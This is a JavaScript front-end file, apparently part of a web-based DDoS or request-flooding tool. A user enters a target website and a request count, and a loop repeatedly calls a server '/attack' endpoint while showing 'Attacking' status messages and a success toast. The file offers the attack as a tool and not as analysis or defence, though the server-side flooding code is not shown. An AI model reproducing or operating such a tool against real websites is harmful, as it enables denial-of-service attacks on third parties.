/*
* dev: Sazumi Viki
* ig: @moe.sazumiviki
* gh: github.com/sazumivicky
* site: sazumi.moe
*/

async function startAttack() {
    var websiteUrl = document.getElementById("websiteInput").value;
    var requestCount = document.getElementById("requestCountInput").value;
    var attackStatus = document.getElementById("attackStatus");
    
    if (!websiteUrl || !requestCount) {
      showAlert("Please enter both website URL and request count.", 'error');
      return;
    }
    
    var url = '/attack?website=' + websiteUrl + '&count=' + requestCount;
    
    try {
      attackStatus.textContent = `Attacking ${websiteUrl} 0 times...`;
    
      for (let i = 1; i <= requestCount; i++) {
        await fetch(url, { method: 'GET' });
        attackStatus.textContent = `Attacking ${websiteUrl} ${i} times...`;
      }
      
      attackStatus.textContent = `Attacking ${websiteUrl} succesfully`;
      showAlert('Attack completed successfully.', 'success');
    } catch (error) {
      console.error('Error:', error);
      showAlert('Internal server error.', 'error');
    }
  }

  function showAlert(message, type) {
    const Toast = Swal.mixin({
      toast: true,
      position: 'top',
      showConfirmButton: false,
      timer: 3000,
      timerProgressBar: true,
      didOpen: (toast) => {
        toast.addEventListener('mouseenter', Swal.stopTimer);
        toast.addEventListener('mouseleave', Swal.resumeTimer);
      }
    });

    Toast.fire({
      icon: type,
      title: message
    });
  }